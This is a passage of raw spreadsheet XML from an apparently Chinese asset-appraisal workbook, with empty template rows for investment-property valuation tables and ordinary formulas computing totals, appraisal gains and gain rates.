      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="381" t="n"/>
      <c r="E10" s="381" t="n"/>
      <c r="F10" s="380" t="n"/>
      <c r="G10" s="587" t="n"/>
      <c r="H10" s="284" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555" t="n"/>
      <c r="M10" s="555" t="n"/>
      <c r="N10" s="552" t="n"/>
      <c r="O10" s="555">
        <f>ROUND(M10*N10/100,-2)</f>
        <v/>
      </c>
      <c r="P10" s="555">
        <f>O10-L10</f>
        <v/>
      </c>
      <c r="Q10" s="555">
        <f>IF(L10=0,"",P10/L10*100)</f>
        <v/>
      </c>
      <c r="R10" s="243" t="n"/>
    </row>
    <row r="11" ht="18" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="381" t="n"/>
      <c r="E11" s="381" t="n"/>
      <c r="F11" s="380" t="n"/>
      <c r="G11" s="587" t="n"/>
      <c r="H11" s="284" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555" t="n"/>
      <c r="M11" s="555" t="n"/>
      <c r="N11" s="552" t="n"/>
      <c r="O11" s="555">
        <f>ROUND(M11*N11/100,-2)</f>
        <v/>
      </c>
      <c r="P11" s="555">
        <f>O11-L11</f>
        <v/>
      </c>
      <c r="Q11" s="555">
        <f>IF(L11=0,"",P11/L11*100)</f>
        <v/>
      </c>
      <c r="R11" s="243" t="n"/>
    </row>
    <row r="12" ht="18" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="381" t="n"/>
      <c r="E12" s="381" t="n"/>
      <c r="F12" s="380" t="n"/>
      <c r="G12" s="587" t="n"/>
      <c r="H12" s="284" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555" t="n"/>
      <c r="M12" s="555" t="n"/>
      <c r="N12" s="552" t="n"/>
      <c r="O12" s="555">
        <f>ROUND(M12*N12/100,-2)</f>
        <v/>
      </c>
      <c r="P12" s="555">
        <f>O12-L12</f>
        <v/>
      </c>
      <c r="Q12" s="555">
        <f>IF(L12=0,"",P12/L12*100)</f>
        <v/>
      </c>
      <c r="R12" s="243" t="n"/>
    </row>
    <row r="13" ht="18" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="381" t="n"/>
      <c r="E13" s="381" t="n"/>
      <c r="F13" s="380" t="n"/>
      <c r="G13" s="587" t="n"/>
      <c r="H13" s="284" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555" t="n"/>
      <c r="M13" s="555" t="n"/>
      <c r="N13" s="552" t="n"/>
      <c r="O13" s="555">
        <f>ROUND(M13*N13/100,-2)</f>
        <v/>
      </c>
      <c r="P13" s="555">
        <f>O13-L13</f>
        <v/>
      </c>
      <c r="Q13" s="555">
        <f>IF(L13=0,"",P13/L13*100)</f>
        <v/>
      </c>
      <c r="R13" s="243" t="n"/>
    </row>
    <row r="14" ht="18" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="381" t="n"/>
      <c r="E14" s="381" t="n"/>
      <c r="F14" s="380" t="n"/>
      <c r="G14" s="587" t="n"/>
      <c r="H14" s="284" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555" t="n"/>
      <c r="M14" s="555" t="n"/>
      <c r="N14" s="552" t="n"/>
      <c r="O14" s="555">
        <f>ROUND(M14*N14/100,-2)</f>
        <v/>
      </c>
      <c r="P14" s="555">
        <f>O14-L14</f>
        <v/>
      </c>
      <c r="Q14" s="555">
        <f>IF(L14=0,"",P14/L14*100)</f>
        <v/>
      </c>
      <c r="R14" s="243" t="n"/>
    </row>
    <row r="15" ht="18" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="381" t="n"/>
      <c r="E15" s="381" t="n"/>
      <c r="F15" s="380" t="n"/>
      <c r="G15" s="587" t="n"/>
      <c r="H15" s="284" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555" t="n"/>
      <c r="M15" s="555" t="n"/>
      <c r="N15" s="552" t="n"/>
      <c r="O15" s="555">
        <f>ROUND(M15*N15/100,-2)</f>
        <v/>
      </c>
      <c r="P15" s="555">
        <f>O15-L15</f>
        <v/>
      </c>
      <c r="Q15" s="555">
        <f>IF(L15=0,"",P15/L15*100)</f>
        <v/>
      </c>
      <c r="R15" s="243" t="n"/>
    </row>
    <row r="16" ht="18" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="381" t="n"/>
      <c r="E16" s="381" t="n"/>
      <c r="F16" s="380" t="n"/>
      <c r="G16" s="587" t="n"/>
      <c r="H16" s="284" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555" t="n"/>
      <c r="M16" s="555" t="n"/>
      <c r="N16" s="552" t="n"/>
      <c r="O16" s="555">
        <f>ROUND(M16*N16/100,-2)</f>
        <v/>
      </c>
      <c r="P16" s="555">
        <f>O16-L16</f>
        <v/>
      </c>
      <c r="Q16" s="555">
        <f>IF(L16=0,"",P16/L16*100)</f>
        <v/>
      </c>
      <c r="R16" s="243" t="n"/>
    </row>
    <row r="17" ht="18" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="381" t="n"/>
      <c r="F17" s="380" t="n"/>
      <c r="G17" s="587" t="n"/>
      <c r="H17" s="284" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555" t="n"/>
      <c r="M17" s="555" t="n"/>
      <c r="N17" s="552" t="n"/>
      <c r="O17" s="555">
        <f>ROUND(M17*N17/100,-2)</f>
        <v/>
      </c>
      <c r="P17" s="555">
        <f>O17-L17</f>
        <v/>
      </c>
      <c r="Q17" s="555">
        <f>IF(L17=0,"",P17/L17*100)</f>
        <v/>
      </c>
      <c r="R17" s="243" t="n"/>
    </row>
    <row r="18" ht="18" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="381" t="n"/>
      <c r="F18" s="380" t="n"/>
      <c r="G18" s="587" t="n"/>
      <c r="H18" s="284" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555" t="n"/>
      <c r="M18" s="555" t="n"/>
      <c r="N18" s="552" t="n"/>
      <c r="O18" s="555">
        <f>ROUND(M18*N18/100,-2)</f>
        <v/>
      </c>
      <c r="P18" s="555">
        <f>O18-L18</f>
        <v/>
      </c>
      <c r="Q18" s="555">
        <f>IF(L18=0,"",P18/L18*100)</f>
        <v/>
      </c>
      <c r="R18" s="243" t="n"/>
    </row>
    <row r="19" ht="18" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="381" t="n"/>
      <c r="F19" s="380" t="n"/>
      <c r="G19" s="587" t="n"/>
      <c r="H19" s="284" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555" t="n"/>
      <c r="M19" s="555" t="n"/>
      <c r="N19" s="552" t="n"/>
      <c r="O19" s="555">
        <f>ROUND(M19*N19/100,-2)</f>
        <v/>
      </c>
      <c r="P19" s="555">
        <f>O19-L19</f>
        <v/>
      </c>
      <c r="Q19" s="555">
        <f>IF(L19=0,"",P19/L19*100)</f>
        <v/>
      </c>
      <c r="R19" s="243" t="n"/>
    </row>
    <row r="20" ht="18" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="381" t="n"/>
      <c r="E20" s="381" t="n"/>
      <c r="F20" s="380" t="n"/>
      <c r="G20" s="587" t="n"/>
      <c r="H20" s="284" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555" t="n"/>
      <c r="M20" s="555" t="n"/>
      <c r="N20" s="552" t="n"/>
      <c r="O20" s="555">
        <f>ROUND(M20*N20/100,-2)</f>
        <v/>
      </c>
      <c r="P20" s="555">
        <f>O20-L20</f>
        <v/>
      </c>
      <c r="Q20" s="555">
        <f>IF(L20=0,"",P20/L20*100)</f>
        <v/>
      </c>
      <c r="R20" s="243" t="n"/>
    </row>
    <row r="21" ht="18" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="381" t="n"/>
      <c r="F21" s="380" t="n"/>
      <c r="G21" s="587" t="n"/>
      <c r="H21" s="284" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555" t="n"/>
      <c r="M21" s="555" t="n"/>
      <c r="N21" s="552" t="n"/>
      <c r="O21" s="555">
        <f>ROUND(M21*N21/100,-2)</f>
        <v/>
      </c>
      <c r="P21" s="555">
        <f>O21-L21</f>
        <v/>
      </c>
      <c r="Q21" s="555">
        <f>IF(L21=0,"",P21/L21*100)</f>
        <v/>
      </c>
      <c r="R21" s="243" t="n"/>
    </row>
    <row r="22" ht="18" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="381" t="n"/>
      <c r="F22" s="380" t="n"/>
      <c r="G22" s="587" t="n"/>
      <c r="H22" s="284" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555" t="n"/>
      <c r="M22" s="555" t="n"/>
      <c r="N22" s="552" t="n"/>
      <c r="O22" s="555">
        <f>ROUND(M22*N22/100,-2)</f>
        <v/>
      </c>
      <c r="P22" s="555">
        <f>O22-L22</f>
        <v/>
      </c>
      <c r="Q22" s="555">
        <f>IF(L22=0,"",P22/L22*100)</f>
        <v/>
      </c>
      <c r="R22" s="243" t="n"/>
    </row>
    <row r="23" ht="18" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="381" t="n"/>
      <c r="F23" s="380" t="n"/>
      <c r="G23" s="587" t="n"/>
      <c r="H23" s="284" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555" t="n"/>
      <c r="M23" s="555" t="n"/>
      <c r="N23" s="552" t="n"/>
      <c r="O23" s="555">
        <f>ROUND(M23*N23/100,-2)</f>
        <v/>
      </c>
      <c r="P23" s="555">
        <f>O23-L23</f>
        <v/>
      </c>
      <c r="Q23" s="555">
        <f>IF(L23=0,"",P23/L23*100)</f>
        <v/>
      </c>
      <c r="R23" s="243" t="n"/>
    </row>
    <row r="24" ht="18" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="381" t="n"/>
      <c r="E24" s="381" t="n"/>
      <c r="F24" s="380" t="n"/>
      <c r="G24" s="587" t="n"/>
      <c r="H24" s="284" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555" t="n"/>
      <c r="M24" s="555" t="n"/>
      <c r="N24" s="552" t="n"/>
      <c r="O24" s="555">
        <f>ROUND(M24*N24/100,-2)</f>
        <v/>
      </c>
      <c r="P24" s="555">
        <f>O24-L24</f>
        <v/>
      </c>
      <c r="Q24" s="555">
        <f>IF(L24=0,"",P24/L24*100)</f>
        <v/>
      </c>
      <c r="R24" s="243" t="n"/>
    </row>
    <row r="25" ht="18" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="381" t="n"/>
      <c r="E25" s="381" t="n"/>
      <c r="F25" s="380" t="n"/>
      <c r="G25" s="587" t="n"/>
      <c r="H25" s="284" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555" t="n"/>
      <c r="M25" s="555" t="n"/>
      <c r="N25" s="552" t="n"/>
      <c r="O25" s="555">
        <f>ROUND(M25*N25/100,-2)</f>
        <v/>
      </c>
      <c r="P25" s="555">
        <f>O25-L25</f>
        <v/>
      </c>
      <c r="Q25" s="555">
        <f>IF(L25=0,"",P25/L25*100)</f>
        <v/>
      </c>
      <c r="R25" s="243" t="n"/>
    </row>
    <row r="26" ht="18" customHeight="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="381" t="n"/>
      <c r="E26" s="381" t="n"/>
      <c r="F26" s="380" t="n"/>
      <c r="G26" s="587" t="n"/>
      <c r="H26" s="284" t="n"/>
      <c r="I26" s="555" t="n"/>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555" t="n"/>
      <c r="L26" s="555" t="n"/>
      <c r="M26" s="555" t="n"/>
      <c r="N26" s="552" t="n"/>
      <c r="O26" s="555">
        <f>ROUND(M26*N26/100,-2)</f>
        <v/>
      </c>
      <c r="P26" s="555">
        <f>O26-L26</f>
        <v/>
      </c>
      <c r="Q26" s="555">
        <f>IF(L26=0,"",P26/L26*100)</f>
        <v/>
      </c>
      <c r="R26" s="243" t="n"/>
    </row>
    <row r="27" ht="18" customHeight="1" s="415">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B27" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C27" s="593" t="n"/>
      <c r="D27" s="567" t="n"/>
      <c r="E27" s="266" t="n"/>
      <c r="F27" s="380" t="n"/>
      <c r="G27" s="115" t="n"/>
      <c r="H27" s="115" t="n"/>
      <c r="I27" s="555">
        <f>ROUND(SUM(I8:I26),2)</f>
        <v/>
      </c>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555">
        <f>ROUND(SUM(K8:K26),2)</f>
        <v/>
      </c>
      <c r="L27" s="555">
        <f>ROUND(SUM(L8:L26),2)</f>
        <v/>
      </c>
      <c r="M27" s="555">
        <f>ROUND(SUM(M8:M26),2)</f>
        <v/>
      </c>
      <c r="N27" s="552" t="n"/>
      <c r="O27" s="555">
        <f>ROUND(SUM(O8:O26),2)</f>
        <v/>
      </c>
      <c r="P27" s="555">
        <f>O27-L27</f>
        <v/>
      </c>
      <c r="Q27" s="555">
        <f>IF(L27=0,"",P27/L27*100)</f>
        <v/>
      </c>
      <c r="R27" s="243" t="n"/>
    </row>
    <row r="28" ht="18" customHeight="1" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>减：投资性房地产减值准备</t>
        </is>
      </c>
      <c r="C28" s="593" t="n"/>
      <c r="D28" s="567" t="n"/>
      <c r="E28" s="307" t="n"/>
      <c r="F28" s="380" t="n"/>
      <c r="G28" s="115" t="n"/>
      <c r="H28" s="115" t="n"/>
      <c r="I28" s="555" t="n"/>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555" t="n"/>
      <c r="L28" s="555" t="n"/>
      <c r="M28" s="555" t="n"/>
      <c r="N28" s="552" t="n"/>
      <c r="O28" s="555" t="n"/>
      <c r="P28" s="555">
        <f>O28-L28</f>
        <v/>
      </c>
      <c r="Q28" s="555">
        <f>IF(L28=0,"",P28/L28*100)</f>
        <v/>
      </c>
      <c r="R28" s="243" t="n"/>
    </row>
    <row r="29" ht="18" customHeight="1" s="415">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B29" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C29" s="593" t="n"/>
      <c r="D29" s="567" t="n"/>
      <c r="E29" s="307" t="n"/>
      <c r="F29" s="380" t="n"/>
      <c r="G29" s="115" t="n"/>
      <c r="H29" s="115" t="n"/>
      <c r="I29" s="555">
        <f>I27-I28</f>
        <v/>
      </c>
      <c r="J29" s="555" t="n"/>
      <c r="K29" s="555">
        <f>K27-K28</f>
        <v/>
      </c>
      <c r="L29" s="555">
        <f>L27-L28</f>
        <v/>
      </c>
      <c r="M29" s="555">
        <f>M27-M28</f>
        <v/>
      </c>
      <c r="N29" s="552" t="n"/>
      <c r="O29" s="555">
        <f>O27-O28</f>
        <v/>
      </c>
      <c r="P29" s="555">
        <f>O29-L29</f>
        <v/>
      </c>
      <c r="Q29" s="555">
        <f>IF(L29=0,"",P29/L29*100)</f>
        <v/>
      </c>
      <c r="R29" s="243" t="n"/>
    </row>
    <row r="30" s="415">
      <c r="A30" s="116" t="n"/>
    </row>
    <row r="31" s="415">
      <c r="A31" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="22">
    <mergeCell ref="H6:H7"/>
    <mergeCell ref="J6:J7"/>
    <mergeCell ref="P6:P7"/>
    <mergeCell ref="R6:R7"/>
    <mergeCell ref="B3:R3"/>
    <mergeCell ref="B29:D29"/>
    <mergeCell ref="M6:O6"/>
    <mergeCell ref="B28:D28"/>
    <mergeCell ref="B2:R2"/>
    <mergeCell ref="G6:G7"/>
    <mergeCell ref="E6:E7"/>
    <mergeCell ref="Q6:Q7"/>
    <mergeCell ref="B6:B7"/>
    <mergeCell ref="B1:R1"/>
    <mergeCell ref="B5:G5"/>
    <mergeCell ref="P4:R4"/>
    <mergeCell ref="I6:I7"/>
    <mergeCell ref="B27:D27"/>
    <mergeCell ref="C6:C7"/>
    <mergeCell ref="K6:L6"/>
    <mergeCell ref="D6:D7"/>
    <mergeCell ref="F6:F7"/>
  </mergeCells>
  <conditionalFormatting sqref="B6:R29">
    <cfRule type="expression" priority="1" dxfId="3">
      <formula>_xlfn.ISFORMULA(B6)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5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 codeName="Sheet52">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:P29"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A8" sqref="A8:A23"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.2"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="9.66666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="8.16666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="9.5" customWidth="1" style="410" min="4" max="4"/>
    <col width="10.3333333333333" customWidth="1" style="410" min="5" max="5"/>
    <col width="5.33333333333333" customWidth="1" style="410" min="6" max="6"/>
    <col width="9.16666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col width="4.5" customWidth="1" style="410" min="8" max="8"/>
    <col width="6.83333333333333" customWidth="1" style="410" min="9" max="9"/>
    <col width="10.1666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="11" max="12"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="13" max="14"/>
    <col outlineLevel="1" width="7.83333333333333" customWidth="1" style="410" min="15" max="15"/>
    <col width="7.5" customWidth="1" style="410" min="16" max="16"/>
    <col width="9" customWidth="1" style="410" min="17" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>投资性房地产——房屋评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="261" t="inlineStr">
        <is>
          <t>（采用公允价值模式计量）</t>
        </is>
      </c>
    </row>
    <row r="3" ht="14" customHeight="1" s="415">
      <c r="A3" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B3" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="4" ht="14" customHeight="1" s="415">
      <c r="A4" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B4" s="376" t="n"/>
      <c r="C4" s="547" t="n"/>
      <c r="D4" s="547" t="n"/>
      <c r="E4" s="547" t="n"/>
      <c r="F4" s="547" t="n"/>
      <c r="G4" s="547" t="n"/>
      <c r="H4" s="547" t="n"/>
      <c r="I4" s="547" t="n"/>
      <c r="J4" s="547" t="n"/>
      <c r="K4" s="547" t="n"/>
      <c r="L4" s="547" t="n"/>
      <c r="M4" s="547" t="n"/>
      <c r="N4" s="547" t="n"/>
      <c r="O4" s="547" t="n"/>
      <c r="P4" s="600" t="inlineStr">
        <is>
          <t>表4-7</t>
        </is>
      </c>
    </row>
    <row r="5" ht="15.75" customHeight="1" s="415">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B5" s="601">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="C5" s="554" t="n"/>
      <c r="D5" s="554" t="n"/>
      <c r="E5" s="554" t="n"/>
      <c r="F5" s="554" t="n"/>
      <c r="G5" s="554" t="n"/>
      <c r="H5" s="554" t="n"/>
      <c r="I5" s="347" t="n"/>
      <c r="J5" s="347" t="n"/>
      <c r="K5" s="347" t="n"/>
      <c r="L5" s="347" t="n"/>
      <c r="M5" s="347" t="n"/>
      <c r="N5" s="347" t="n"/>
      <c r="O5" s="347" t="n"/>
      <c r="P5" s="391">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="6" ht="18" customFormat="1" customHeight="1" s="204">
      <c r="A6" s="116" t="inlineStr">
        <is>
          <t>检索表头1</t>
        </is>
      </c>
      <c r="B6" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C6" s="380" t="inlineStr">
        <is>
          <t>权证编号</t>
        </is>
      </c>
      <c r="D6" s="380" t="inlineStr">
        <is>
          <t>房屋名称</t>
        </is>
      </c>
      <c r="E6" s="264" t="inlineStr">
        <is>
          <t>来源</t>
        </is>
      </c>
      <c r="F6" s="177" t="inlineStr">
        <is>
          <t>结构</t>
        </is>
      </c>
      <c r="G6" s="177" t="inlineStr">
        <is>
          <t>建成
年月</t>
        </is>
      </c>
      <c r="H6" s="599" t="inlineStr">
        <is>
          <t>计量单位</t>
        </is>
      </c>
      <c r="I6" s="599" t="inlineStr">
        <is>
          <t>建筑          面积</t>
        </is>
      </c>
      <c r="J6" s="177" t="inlineStr">
        <is>
          <t>成本单价(元/m2)</t>
        </is>
      </c>
      <c r="K6" s="177" t="inlineStr">
        <is>
          <t>原始入帐价值 （转入日公允价值）</t>
        </is>
      </c>
      <c r="L6" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="M6" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="N6" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="O6" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="P6" s="185" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="7" ht="33" customFormat="1" customHeight="1" s="204">
      <c r="A7" s="116" t="inlineStr">
        <is>
          <t>检索表头2</t>
        </is>
      </c>
      <c r="B7" s="594" t="n"/>
      <c r="C7" s="594" t="n"/>
      <c r="D7" s="594" t="n"/>
      <c r="E7" s="594" t="n"/>
      <c r="F7" s="594" t="n"/>
      <c r="G7" s="594" t="n"/>
      <c r="H7" s="594" t="n"/>
      <c r="I7" s="594" t="n"/>
      <c r="J7" s="594" t="n"/>
      <c r="K7" s="594" t="n"/>
      <c r="L7" s="594" t="n"/>
      <c r="M7" s="594" t="n"/>
      <c r="N7" s="594" t="n"/>
      <c r="O7" s="594" t="n"/>
      <c r="P7" s="594" t="n"/>
    </row>
    <row r="8" ht="18" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="381" t="n"/>
      <c r="E8" s="381" t="n"/>
      <c r="F8" s="380" t="n"/>
      <c r="G8" s="587" t="n"/>
      <c r="H8" s="284" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="inlineStr"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555" t="n"/>
      <c r="M8" s="555" t="n"/>
      <c r="N8" s="555">
        <f>M8-L8</f>
        <v/>
      </c>
      <c r="O8" s="555">
        <f>IF(L8=0,"",N8/L8*100)</f>
        <v/>
      </c>
      <c r="P8" s="180" t="n"/>
    </row>
    <row r="9" ht="18" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="381" t="n"/>
      <c r="E9" s="381" t="n"/>
      <c r="F9" s="380" t="n"/>
      <c r="G9" s="587" t="n"/>
      <c r="H9" s="284" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555" t="n"/>
      <c r="M9" s="555" t="n"/>
      <c r="N9" s="555">
        <f>M9-L9</f>
        <v/>
      </c>
      <c r="O9" s="555">
        <f>IF(L9=0,"",N9/L9*100)</f>
        <v/>
      </c>
      <c r="P9" s="180" t="n"/>
    </row>
    <row r="10" ht="18" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="381" t="n"/>
      <c r="E10" s="381" t="n"/>
      <c r="F10" s="380" t="n"/>
      <c r="G10" s="587" t="n"/>
      <c r="H10" s="284" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555" t="n"/>
      <c r="M10" s="555" t="n"/>
      <c r="N10" s="555">
        <f>M10-L10</f>
        <v/>
      </c>
      <c r="O10" s="555">
        <f>IF(L10=0,"",N10/L10*100)</f>
        <v/>
      </c>
      <c r="P10" s="180" t="n"/>
    </row>
    <row r="11" ht="18" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="381" t="n"/>
      <c r="E11" s="381" t="n"/>
      <c r="F11" s="380" t="n"/>
      <c r="G11" s="587" t="n"/>
      <c r="H11" s="284" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555" t="n"/>
      <c r="M11" s="555" t="n"/>
      <c r="N11" s="555">
        <f>M11-L11</f>
        <v/>
      </c>
      <c r="O11" s="555">
        <f>IF(L11=0,"",N11/L11*100)</f>
        <v/>
      </c>
      <c r="P11" s="180" t="n"/>
    </row>
    <row r="12" ht="18" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="381" t="n"/>
      <c r="E12" s="381" t="n"/>
      <c r="F12" s="380" t="n"/>
      <c r="G12" s="587" t="n"/>
      <c r="H12" s="284" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555" t="n"/>
      <c r="M12" s="555" t="n"/>
      <c r="N12" s="555">
        <f>M12-L12</f>
        <v/>
      </c>
      <c r="O12" s="555">
        <f>IF(L12=0,"",N12/L12*100)</f>
        <v/>
      </c>
      <c r="P12" s="180" t="n"/>
    </row>
